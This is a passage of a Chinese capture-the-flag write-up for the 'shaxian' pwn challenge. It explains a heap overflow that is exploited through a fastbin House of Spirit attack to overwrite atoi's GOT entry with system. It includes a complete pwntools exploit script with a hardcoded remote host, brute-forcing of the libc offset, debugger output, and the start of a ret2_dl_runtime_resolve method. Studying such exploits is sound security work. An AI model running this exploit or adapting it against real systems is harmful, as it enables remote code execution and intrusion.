class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>地址写</code>的逻辑主要是通过<code>fastbin</code>来修改<code>head指针</code>，在<code>head_ptr_0804B1C0</code>处伪造一个假的堆块<code>fake_chunk</code>，修改<code>next指针</code>指向该fake_chunk，然后通过<code>free</code>成功释放掉该fake_chunk。<code>再次申请</code>时，该fake_chunk将被分配，并且刚好能实现4字节<code>任意地址</code>写<code>任意数据</code>(将atoi_got改写为system)，所以下次输入编号的时候，直接输入“/bin/sh”即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">head_ptr_0804B1C0 = (shopping_cart_struct *)<span class="built_in">malloc</span>(<span class="number">40u</span>);</span><br><span class="line"><span class="keyword">if</span> ( !head_ptr_0804B1C0 )                     <span class="comment">// buffer分配出错</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Error"</span>);</span><br><span class="line">head_ptr_0804B1C0-&gt;next = (<span class="keyword">int</span>)tmp_head_ptr;</span><br><span class="line">input_message(<span class="number">0</span>, (<span class="keyword">int</span>)head_ptr_0804B1C0-&gt;food_type, <span class="number">60</span>, <span class="number">10</span>);<span class="comment">// 漏洞点,堆溢出</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"How many?"</span>);</span><br><span class="line">tmp_ptr = head_ptr_0804B1C0;</span><br><span class="line">tmp_ptr-&gt;count = get_num();</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;然而本题的考点主要在于，<code>libc</code>是主办方<code>自己编译</code>的，网上无法查到，所以其偏移带有特殊性。这里必须通过某种方法对其进行泄露，由于这里是堆中，修改的信息十分有限，不像栈那样简单。因此此题可以使用<code>两种方法</code>来求解。</p><h3 id="0x20-方法一：对libc库中的函数偏移进行爆破。"><a href="#0x20-方法一：对libc库中的函数偏移进行爆破。" class="headerlink" title="0x20 方法一：对libc库中的函数偏移进行爆破。"></a>0x20 方法一：对libc库中的函数偏移进行爆破。</h3><p><strong><code>利用思路</code></strong>：</p><p>1、根据经验，<code>system地址</code>与<code>atoi地址</code>相距并不远(atoi在libc中的偏移是小于system的)，而且这些<code>库函数的地址</code>大都比较规整，为<code>0x10</code>的整数倍，于是可以通过<code>暴力破解</code>得到system的地址。为了<code>防止卡死</code>，我们通过发送<code>&quot;cat /home/ctf/flag&quot;</code>命令，作为system的参数，让远程服务器执行，通过<code>返回的结果</code>来判断是否正确执行，从而判断是否得到system函数与atoi函数的偏移。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.writeline(<span class="string">'/bin/cat /home/*/Desktop/flag'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">data = io.recv(<span class="number">200</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"RCTF"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"No such file"</span> <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"----------------dis is correct!!!----------------"</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;虽然偏移不会很大，但是为了节省时间，我们可以<code>分段</code>进行<code>暴力破解</code>。如：分别从0x0，0x5000，0xA000，0xD000的距离开始破解。</p><p>2、点菜时，我们通过输入<code>food_type</code>将其后面的的<code>next指针</code>覆盖为<code>atoi_got-0x4</code>，因为<code>next指针</code>指向的是结构体中的<code>count成员</code>，而它的大小为<code>0x4字节</code>。所以，通过<code>Review</code>查看的时候，会通过[next]-&gt;food_type将<code>atoi_got</code>的内容输出出来。我们就得到了<code>atoi的地址</code>。加上<code>dis</code>(system与atoi的偏移)，就可以得到<code>system的地址</code>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'A'</span>*<span class="number">32</span> + p32(atoi_got - <span class="number">4</span>)</span><br><span class="line">dian_cai(io,payload,<span class="number">2</span>) <span class="comment"># 修改next指针为(atoi_got - 4)</span></span><br><span class="line">atoi_addr = leak_atoi_addr(io)</span><br></pre></td></tr></table></figure></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s * %d\n"</span>, tmp_head_ptr-&gt;food_type, tmp_head_ptr-&gt;count);</span><br><span class="line">  tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、因为每次点菜时，分配的堆块大小为<code>0x30字节</code>，处于<code>fastbin范围</code>之内(16byte - 64byte)，所以，我们可以使用Fastbin相关漏洞利用技术进行攻击。再次点菜时，我们使用<code>Fastbin Attack</code>中的<code>House of Spirit</code>类型漏洞利用技术，并将<code>next指针</code>覆盖为<code>head_ptr_0804B1C0 - 0x8</code>。在此之前，我们已经将<code>head_ptr_0804B1C0</code>周围的内存区域构造成了一个<code>fake_chunk</code>，输入<code>Phone_number</code>和<code>Address</code>时，我们分别构造了<code>fake_chunk</code>的chunk_header和fake_chunk相邻的<code>下一chunk</code>的chunk_header。构造的目的是绕过<code>Free函数</code>中的一些检测，使fake_chunk成功放入<code>fastbin链表</code>中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">内存布局：</span></span><br><span class="line"><span class="string">0x0804B0C0 - 0x0804B1C0  Phone_number </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[fake_chunk] for head_ptr</span></span><br><span class="line"><span class="string">0x0804B1B0 - 0x0804B1B8  chunk_header</span></span><br><span class="line"><span class="string">0x0804B1B8 - 0x0804B1BC  count</span></span><br><span class="line"><span class="string">0x0804B1BC - 0x0804B1C0------------</span></span><br><span class="line"><span class="string">0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span></span><br><span class="line"><span class="string">0x0804B1C4 - 0x0804B1DC------------</span></span><br><span class="line"><span class="string">0x0804B1DC - 0x0804B1E0  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0804B1E0 - 0x0804B1E8  Address(next_chunk's chunk_header)</span></span><br><span class="line"><span class="string">0x0804B1E8 - 0x0804B2E0  Address</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Your Address:\n'</span>)</span><br><span class="line">io.sendline(p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>))</span><br><span class="line">io.recvuntil(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span>*<span class="number">244</span> + p32(<span class="number">0x31</span>))</span><br><span class="line">......</span><br><span class="line">payload1 = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">dian_cai(io,payload1,<span class="number">3</span>)<span class="comment"># 修改next指针为(head_ptr - 8)</span></span><br></pre></td></tr></table></figure></p><p>4、接下来，我们再通过Submit()函数中的<code>Free()函数</code>，将此fake_chunk释放入<code>fastbin链表</code>中。由于fake_chunk是<code>最后一个</code>释放的chunk，所以排在<code>fastbin链表</code>的<code>头部</code>。下次调用<code>malloc()函数</code>分配堆块时，就会<code>分配</code>到这个fake_chunk，从而可以<code>更改</code>fake_chunk的内容。若我们将<code>head_ptr的内容</code>修改为<code>atoi_got</code>，输入count时，将system的地址填入，就将<code>system地址</code>写到了<code>atoi_got</code>。下次调用atoi()函数时，输入“/bin/sh”，就相当于调用了<code>system(&quot;/bin/sh&quot;)</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 执行完Submit()</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x0</span><br><span class="line">0x30: 0x804b1b0 —▸ 0x804c060 ◂— 0x0</span><br><span class="line">0x38: 0x0</span><br><span class="line">0x40: 0x0</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将system地址写入atoi的got表中</span></span><br><span class="line">system_addr = sign_Hex2Dec(system_addr)</span><br><span class="line"><span class="comment"># system_addr = struct.unpack("i",p32(system_addr))[0]</span></span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">4</span> + p32(atoi_got)</span><br><span class="line">dian_cai(io,payload2,system_addr) <span class="comment"># 0x804b1b8</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由于我们输入的<code>count</code>是以<code>字符串形式</code>输入的，之后会经过<code>atoi()函数</code>，将我们的输入转化为<code>整数</code>，存储于count中。我们得到的<code>system()函数地址</code>是<code>16进制形式</code>的字符串，所以我们需要将system()函数的地址值转化为<code>有符号10进制字符串</code>输入(count为int型)，才能使count中保存的是我们所需要的system()函数的地址。</p><p><strong><code>完整exp</code></strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># libc版本: libc6_2.23-0ubuntu11.2_i386</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct,time</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./shaxian'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x08048B31,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x08048912,malloc后，查看分配的堆块的数据域地址</span></span><br><span class="line"><span class="string">bp 0x08048B8E,Diancai函数返回地址</span></span><br><span class="line"><span class="string">bp 0x080489F6,查看要Free的堆块地址</span></span><br><span class="line"><span class="string">bp 0x08048B95,Submit函数返回地址</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">gdbscript = <span class="string">'''</span></span><br><span class="line"><span class="string">            bp 0x08048B31</span></span><br><span class="line"><span class="string">            bp 0x08048912</span></span><br><span class="line"><span class="string">            bp 0x08048B8E</span></span><br><span class="line"><span class="string">            bp 0x080489F6</span></span><br><span class="line"><span class="string">            bp 0x08048B95'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'220.249.52.133'</span>,<span class="number">34604</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./shaxian'</span>,gdbscript = gdbscript)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./shaxian'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_info</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Your Address:\n'</span>)</span><br><span class="line">    io.sendline(p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>))</span><br><span class="line">    io.recvuntil(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'A'</span>*<span class="number">240</span> + p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dian_cai</span><span class="params">(io,name,count)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'5.Jianjiao\n'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'How many?\n'</span>)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receipt</span><span class="params">(io,taitou)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)  <span class="comment"># 程序中用的是puts()</span></span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Taitou:'</span>)    <span class="comment"># 程序中用的是printf()</span></span><br><span class="line">    io.sendline(taitou)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">review</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_atoi_addr</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'* 2\n'</span>)</span><br><span class="line">    atoi_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">return</span> atoi_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_Hex2Dec</span><span class="params">(data)</span>:</span></span><br><span class="line">    width = <span class="number">32</span>  <span class="comment"># 16进制数所占位数</span></span><br><span class="line">    dec_data = int(hex(data)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> dec_data &gt; (<span class="number">2</span>  (width - <span class="number">1</span>) - <span class="number">1</span>):</span><br><span class="line">        tmp_data = <span class="number">2</span>  width - dec_data</span><br><span class="line">        sign_dec = <span class="number">0</span> - tmp_data</span><br><span class="line">    <span class="keyword">return</span> sign_dec</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_system_dis</span><span class="params">()</span>:</span></span><br><span class="line">    dis = <span class="number">0xDB00</span></span><br><span class="line">    <span class="comment"># dis = 0xD000</span></span><br><span class="line">    <span class="keyword">while</span> dis &lt; <span class="number">0xFFFFFF</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"*Start*"</span></span><br><span class="line">            io = get_io()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"dis:"</span>,hex(dis)</span><br><span class="line">            pwn(io,dis)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"End"</span></span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            dis += <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">read_got = <span class="number">0x0804B010</span></span><br><span class="line">atoi_got = <span class="number">0x0804B038</span></span><br><span class="line">head_ptr = <span class="number">0x0804B1C0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc6_2.23-0ubuntu11.2_i386</span></span><br><span class="line"><span class="comment"># offset_atoi = 0x2D260</span></span><br><span class="line"><span class="comment"># offset_system = 0x3ADB0</span></span><br><span class="line"><span class="comment"># offset_puts = 0x5FCB0</span></span><br><span class="line"><span class="comment"># offset_read = 0xD5C00</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io,dis)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    内存布局：</span></span><br><span class="line"><span class="string">    0x0804B0C0 - 0x0804B1C0  Phone_number </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [fake_chunk] for head_ptr</span></span><br><span class="line"><span class="string">    0x0804B1B0 - 0x0804B1B8  chunk_header</span></span><br><span class="line"><span class="string">    0x0804B1B8 - 0x0804B1BC  count</span></span><br><span class="line"><span class="string">    0x0804B1BC - 0x0804B1C0------------</span></span><br><span class="line"><span class="string">    0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span></span><br><span class="line"><span class="string">    0x0804B1C4 - 0x0804B1DC------------</span></span><br><span class="line"><span class="string">    0x0804B1DC - 0x0804B1E0  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0x0804B1E0 - 0x0804B1E8  Address(next_chunk's chunk_header)</span></span><br><span class="line"><span class="string">    0x0804B1E8 - 0x0804B2E0  Address</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    input_info(io)</span><br><span class="line">    dian_cai(io,<span class="string">'Banmian'</span>,<span class="number">1</span>)    <span class="comment"># 先点一次菜，使atoi()函数得到调用，atoi()的GOT表得到填充</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">32</span> + p32(atoi_got - <span class="number">4</span>)</span><br><span class="line">    dian_cai(io,payload,<span class="number">2</span>)      <span class="comment"># 修改next指针为(atoi_got - 4)</span></span><br><span class="line">    atoi_addr = leak_atoi_addr(io)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"atoi_addr:"</span>,hex(atoi_addr)</span><br><span class="line">    payload1 = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,payload1,<span class="number">3</span>)     <span class="comment"># 修改next指针为(head_ptr - 8)</span></span><br><span class="line"></span><br><span class="line">    submit(io)<span class="comment"># 释放shopping_cart结构体内存</span></span><br><span class="line">    raw_input(<span class="string">'After submit'</span>)</span><br><span class="line">    </span><br><span class="line">    system_addr = atoi_addr + dis</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    system_addr = sign_Hex2Dec(system_addr)</span><br><span class="line">    <span class="comment"># system_addr = struct.unpack("i",p32(system_addr))[0]</span></span><br><span class="line">    <span class="keyword">print</span> system_addr</span><br><span class="line">    payload2 = <span class="string">'A'</span>*<span class="number">4</span> + p32(atoi_got)</span><br><span class="line">    <span class="comment"># 重新分配的堆块为之前释放的堆块(head_ptr - 8)，之后head_ptr指向该堆块，next = atoi_got</span></span><br><span class="line">    dian_cai(io,payload2,system_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        io.writeline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.writeline(<span class="string">'/bin/cat /home/buffer/Desktop/flag'</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        data = io.recv(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"RCTF"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"No such file"</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"----------------dis is correct!!!----------------"</span></span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    flag = <span class="number">1</span><span class="comment"># flag = 1表示已找到dis</span></span><br><span class="line">    debug = <span class="number">0</span><span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        dis = <span class="number">0xDB50</span><span class="comment"># system()函数地址与atoi()函数地址的差值</span></span><br><span class="line">        <span class="comment"># dis = 0xD600# system()中调用的函数的地址与atoi()函数地址的差值</span></span><br><span class="line">        io = get_io()</span><br><span class="line">        pwn(io,dis)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        get_system_dis()</span><br></pre></td></tr></table></figure></p><h3 id="0x30-方法二：使用ret2-dl-runtime-resolve方式进行利用。"><a href="#0x30-方法二：使用ret2-dl-runtime-resolve方式进行利用。" class="headerlink" title="0x30 方法二：使用ret2_dl_runtime_resolve方式进行利用。"></a>0x30 方法二：使用ret2_dl_runtime_resolve方式进行利用。</h3><p>&emsp;&emsp;<code>FlappyPig</code>所给的exp我没有利用成功，我分析了一下其脚本中所使用的<code>内存布局</code>。其将<code>fake_chain</code>(也就是假的重定位项、符号项、符号字符串以及system函数参数)布置在了<code>Address缓冲区的末尾</code>，但是sym_data所对应的<code>sym_index</code>所找到的符号版本索引(ndx)为<code>0x55C3</code>，使<code>l-&gt;l_version[ndx]</code>访问到了<code>不可访问</code>的地址。但是我计算了一下，将<code>fake_chain</code>布置在<code>Address</code>，还是<code>Phone_number</code>和<code>Title</code>，只能得到少数几个符号版本表vernum(.gnu.version)中合理的ndx值，不过，这就够了。<code>ndx</code>也可以越界访问<code>l_version数组</code>，但是需要让访问到的地址的<code>version-&gt;Hash</code>位置的值为0。<code>ndx值</code>一般为下面可执行文件或libc的符号版本信息中<code>“.gnu.version_d”</code>中的index的值(Elf32_Verdef)或<code>“.gnu.version_r”</code>中的version值(Elf32_Vernaux中的vna_other成员)(实际上好像有点偏差，但不大)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -V shaxian</span><br><span class="line"></span><br><span class="line">Version symbols section &apos;.gnu.version&apos; contains 17 entries:</span><br><span class="line"> Addr: 0000000008048396  Offset: 0x000396  Link: 5 (.dynsym)</span><br><span class="line">  000:   0 (*local*)       2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)  </span><br><span class="line">  004:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)     3 (GLIBC_2.4)  </span><br><span class="line">  008:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     0 (*local*)       2 (GLIBC_2.0)  </span><br><span class="line">  00c:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)     1 (*global*)   </span><br><span class="line">  010:   2 (GLIBC_2.0)  </span><br><span class="line"></span><br><span class="line">Version needs section &apos;.gnu.version_r&apos; contains 1 entries:</span><br><span class="line"> Addr: 0x00000000080483b8  Offset: 0x0003b8  Link: 6 (.dynstr)</span><br><span class="line">  000000: Version: 1  File: libc.so.6  Cnt: 2</span><br><span class="line">  0x0010:   Name: GLIBC_2.4  Flags: none  Version: 3</span><br><span class="line">  0x0020:   Name: GLIBC_2.0  Flags: none  Version: 2</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">$ readelf -V libc-2.23.so </span><br><span class="line"></span><br><span class="line">Version symbols section &apos;.gnu.version&apos; contains 2415 entries:</span><br><span class="line"> Addr: 000000000001345c  Offset: 0x01345c  Link: 4 (.dynsym)</span><br><span class="line">  000:   0 (*local*)      24 (GLIBC_2.1)    25 (GLIBC_PRIVATE)  25 (GLIBC_PRIVATE)</span><br><span class="line">  004:   0 